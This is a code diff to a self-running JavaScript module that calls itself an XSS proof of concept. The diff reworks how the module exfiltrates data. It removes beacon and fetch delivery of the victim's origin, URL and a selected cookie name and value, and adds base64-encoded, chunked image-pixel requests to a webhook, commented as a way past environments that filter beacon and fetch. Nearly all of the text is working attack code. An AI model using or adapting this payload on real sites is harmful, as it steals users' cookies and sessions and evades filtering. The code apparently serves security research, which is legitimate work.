@@ -72,69 +72,51 @@ define([], function () {
     };
   }
 
+  function encodeBase64Utf8(str) {
+    try {
+      return btoa(unescape(encodeURIComponent(str)));
+    } catch (e) {
+      return "";
+    }
+  }
+
+  function makeSessionId() {
+    var rnd = Math.random().toString(36).slice(2, 10);
+    return "cp" + Date.now().toString(36) + rnd;
+  }
+
   function sendPayload(payload) {
     var serialized = safeCall(function () { return JSON.stringify(payload); }, "{}");
-    var delivery = {
-      beacon: null,
-      fetchStarted: false,
-      imageFallback: false
-    };
+    var base64Payload = encodeBase64Utf8(serialized);
+    var chunkSize = 1400;
+    var total = Math.ceil(base64Payload.length / chunkSize);
+    var session = makeSessionId();
+    var sent = 0;
+    var lastUrl = null;
 
-    try {
-      if (navigator.sendBeacon) {
-        delivery.beacon = navigator.sendBeacon(
-          WEBHOOK_URL,
-          new Blob([serialized], { type: "text/plain;charset=UTF-8" })
-        );
-      }
-    } catch (e) {
-      delivery.beacon = "error:" + (e && e.message ? e.message : String(e));
-    }
-
-    try {
-      if (window.fetch) {
-        fetch(WEBHOOK_URL, {
-          method: "POST",
-          mode: "no-cors",
-          credentials: "omit",
-          keepalive: true,
-          headers: { "content-type": "text/plain;charset=UTF-8" },
-          body: serialized
-        }).catch(function () {});
-        delivery.fetchStarted = true;
-      }
-    } catch (e) {
-      delivery.fetchStarted = "error:" + (e && e.message ? e.message : String(e));
-    }
-
-    // Single GET fallback for environments where beacon/fetch are filtered.
-    try {
-      var p = payload || {};
-      var m = p.marker || {};
-      var c = p.selectedCookieProof || {};
-      var qs = [
-        "event=" + encodeURIComponent(p.event || "cp_hash_loader_xss_exec_proof"),
-        "ts=" + encodeURIComponent(m.ts || nowIso()),
-        "origin=" + encodeURIComponent(m.victimOrigin || window.location.origin),
-        "href=" + encodeURIComponent(m.victimHref || window.location.href),
-        "domain=" + encodeURIComponent(m.documentDomain || document.domain || ""),
-        "cookie_name=" + encodeURIComponent(c.name || ""),
-        "cookie_value=" + encodeURIComponent(c.value || ""),
-        "cookie_count=" + encodeURIComponent(String(p.cookieCount || 0)),
-        "title=" + encodeURIComponent(p.title || "")
-      ].join("&");
-
+    for (var i = 0; i < total; i++) {
+      var chunk = base64Payload.slice(i * chunkSize, (i + 1) * chunkSize);
       var img = new Image();
       img.referrerPolicy = "no-referrer";
-      img.src = WEBHOOK_URL + "?" + qs;
-      delivery.imageFallback = true;
-      delivery.imageUrl = img.src;
-      window.__CP_POC_LAST_IMG_URL__ = img.src;
-    } catch (e) {
-      delivery.imageFallback = "error:" + (e && e.message ? e.message : String(e));
+      img.src = WEBHOOK_URL +
+        "?event=cp_loader_chunk" +
+        "&sid=" + encodeURIComponent(session) +
+        "&idx=" + i +
+        "&total=" + total +
+        "&ts=" + encodeURIComponent(nowIso()) +
+        "&d=" + encodeURIComponent(chunk);
+      sent += 1;
+      lastUrl = img.src;
     }
 
-    window.__CP_POC_DELIVERY__ = delivery;
+    window.__CP_POC_DELIVERY__ = {
+      mode: "image_chunks",
+      session: session,
+      totalChunks: total,
+      sentChunks: sent
+    };
+    window.__CP_POC_CHUNK_COUNT__ = total;
+    window.__CP_POC_LAST_IMG_URL__ = lastUrl;
   }
 
   function markVisualProof(ts) {
@@ -208,7 +190,7 @@ define([], function () {
   executePoC();
 
   return {
-    version: "102.0.0-single-post-plus-image-fallback",
+    version: "103.0.0-image-chunks",
     render: function () {
       return executePoC();
     }
